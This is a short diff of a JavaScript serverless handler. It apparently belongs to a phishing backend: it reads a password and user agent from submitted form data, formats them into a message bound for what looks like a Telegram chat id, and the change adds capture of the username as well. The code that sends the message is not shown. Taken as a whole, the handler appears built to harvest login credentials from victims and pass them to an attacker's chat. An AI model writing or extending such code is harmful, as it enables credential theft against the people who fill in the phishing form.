@@ -8,12 +8,13 @@ module.exports = async function handler(req, res) {
   const chatId = '-5263210542';
 
   try {
-    const { pass, agent } = req.body;
+    const { pass,username, agent } = req.body;
 
     const message = `
   a24
 
-🔑 Pass: ${pass}
+  username: ${username}
+ Pass: ${pass}
 🖥️ Agent: ${agent}
     `;
 
